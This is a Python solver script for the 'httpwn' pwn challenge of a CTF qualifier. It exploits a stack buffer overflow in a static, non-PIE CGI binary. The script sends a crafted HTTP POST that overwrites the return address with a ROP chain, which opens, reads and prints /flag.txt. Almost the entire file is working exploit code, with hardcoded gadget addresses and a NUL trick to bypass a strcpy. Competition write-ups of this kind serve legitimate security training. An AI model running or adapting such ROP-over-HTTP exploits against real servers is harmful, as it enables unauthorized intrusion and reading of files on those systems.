#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import struct
import sys
from urllib.parse import urlparse

#
# Techcompfest CTF 2026 Quals - pwn/httpwn
#
# Target is an Apache CGI binary (static, non-PIE, no stack protector).
# Bug: read(0, data, CONTENT_LENGTH) into a 48-byte stack buffer => stack overflow.
# Gotcha: program later does strcpy(username, data+9); so we place a NUL right after "username=".
#
# This solver sends an HTTP POST with a crafted body that overwrites RIP with a ROP chain:
#   open("/flag.txt", O_RDONLY) -> read(fd, buf, 0x100) -> write(1, buf, 0x100)
#
# Notes:
# - Addresses below match the provided build flags (-static -no-pie) from the dist Makefile.
# - Default CGI path is /cgi-bin/httpwn.cgi (as per the dist install target).
#

OFFSET_TO_RIP = 0x68  # data@rbp-0x60 to saved RIP@rbp+8

# Writable scratch (last RW segment ends near _end; a small cushion is still mapped)
SCRATCH = 0x4ACB00
PATH_ADDR = SCRATCH
BUF_ADDR  = SCRATCH + 0x100

def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)

# Gadgets / functions (static binary)
POP_RDI = 0x401D80                 # pop rdi ; ret
POP_RSI = 0x40F772                 # pop rsi ; ret
POP_RDX_RBX = 0x469877             # pop rdx ; pop rbx ; ret
MOV_QWORD_PTR_RDI_RDX = 0x430893   # mov qword ptr [rdi], rdx ; ret
RET = 0x401741                     # ret (alignment)

OPEN  = 0x438600                   # open
READ  = 0x438730                   # read / __libc_read
WRITE = 0x4387D0                   # write / __libc_write
EXIT  = 0x408C70                   # exit

def build_rop() -> bytes:
    # Write "/flag.txt\0" into memory at PATH_ADDR using MOV_QWORD_PTR_RDI_RDX
    first8  = b"/flag.tx"                          # 8 bytes
    second8 = b"t\x00\x00\x00\x00\x00\x00\x00"     # "t\0...."

    chain = b"".join([
        # *(u64*)PATH_ADDR = "/flag.tx"
        p64(POP_RDI), p64(PATH_ADDR),
        p64(POP_RDX_RBX), first8.ljust(8, b"\x00"), p64(0),
        p64(MOV_QWORD_PTR_RDI_RDX),

        # *(u64*)(PATH_ADDR+8) = "t\0..."
        p64(POP_RDI), p64(PATH_ADDR + 8),
        p64(POP_RDX_RBX), second8, p64(0),
        p64(MOV_QWORD_PTR_RDI_RDX),

        # open(PATH_ADDR, 0, 0)
        p64(POP_RDI), p64(PATH_ADDR),
        p64(POP_RSI), p64(0),
        p64(POP_RDX_RBX), p64(0), p64(0),
        p64(OPEN),

        # read(3, BUF_ADDR, 0x100)
        # (fd is expected to be 3: stdin/out/err already opened in CGI context)
        p64(POP_RDI), p64(3),
        p64(POP_RSI), p64(BUF_ADDR),
        p64(POP_RDX_RBX), p64(0x100), p64(0),
        p64(READ),

        # write(1, BUF_ADDR, 0x100)
        p64(POP_RDI), p64(1),
        p64(POP_RSI), p64(BUF_ADDR),
        p64(POP_RDX_RBX), p64(0x100), p64(0),
        p64(WRITE),

        # exit(0)
        p64(POP_RDI), p64(0),
        p64(RET),
        p64(EXIT),
    ])

    # The pop rdx gadget expects an 8-byte value; we used raw bytes for first8 already.
    # Ensure both "first8" and "second8" are exactly 8 bytes.
    # (first8 is padded above, second8 is already 8 bytes)
    return chain

def build_body() -> bytes:
    rop = build_rop()

    # Make strcpy(username, data+9) copy an empty string:
    # data = b"username=" + b"\x00" + padding + saved_rip_overwrite
    prefix = b"username=\x00"

    pad_len = OFFSET_TO_RIP - len(prefix)
    if pad_len < 0:
        raise ValueError("Unexpected: prefix longer than RIP offset")
    padding = b"A" * pad_len

    return prefix + padding + rop

def recv_all(sock: socket.socket) -> bytes:
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)

def send_http(host: str, port: int, path: str, use_tls: bool) -> bytes:
    body = build_body()

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: solver\r\n"
        "Connection: close\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n"
    ).encode("ascii") + body

    raw = socket.create_connection((host, port), timeout=10)
    raw.settimeout(10)

    if use_tls:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(raw, server_hostname=host)
    else:
        s = raw

    try:
        s.sendall(req)
        return recv_all(s)
    finally:
        try:
            s.close()
        except Exception:
            pass

def extract_flag(blob: bytes) -> bytes | None:
    m = re.search(br"TCF\{[^}]+\}", blob)
    return m.group(0) if m else None

def parse_target(args):
    # Accept either a full URL or host/port.
    if args.url:
        u = urlparse(args.url)
        host = u.hostname
        port = u.port or (443 if u.scheme == "https" else 80)
        use_tls = (u.scheme == "https")
        # if URL is just https://host:port/ then path is "/"
        path = u.path if u.path else "/"
        return host, port, path, use_tls
    else:
        host = args.host
        port = args.port
        use_tls = args.https
        path = args.path
        return host, port, path, use_tls

def main():
    ap = argparse.ArgumentParser(description="httpwn solver (CGI ROP over HTTP/HTTPS)")
    ap.add_argument("--url", help="Full target URL, e.g. https://host:port/cgi-bin/httpwn.cgi")
    ap.add_argument("host", nargs="?", default=None, help="Target host (if not using --url)")
    ap.add_argument("port", nargs="?", type=int, default=None, help="Target port (if not using --url)")
    ap.add_argument("--path", default="/cgi-bin/httpwn.cgi", help="HTTP path (if not using --url)")
    ap.add_argument("--https", action="store_true", help="Use TLS (if not using --url)")
    ap.add_argument("--try-paths", action="store_true",
                    help="Try a few common CGI paths until a flag is found")
    args = ap.parse_args()

    host, port, path, use_tls = parse_target(args)
    if not host or not port:
        ap.error("Provide --url OR host port")

    paths = [path]
    if args.try_paths:
        # minimal, common guesses based on the provided dist layout
        candidates = [
            "/cgi-bin/httpwn.cgi",
            "/cgi-bin/httpwn",
            "/httpwn.cgi",
            "/",
        ]
        for p in candidates:
            if p not in paths:
                paths.append(p)

    last = b""
    for p in paths:
        out = send_http(host, port, p, use_tls)
        last = out
        flag = extract_flag(out)
        if flag:
            sys.stdout.buffer.write(flag + b"\n")
            return

    # No flag found; dump response for debugging
    sys.stdout.buffer.write(last)

if __name__ == "__main__":
    main()
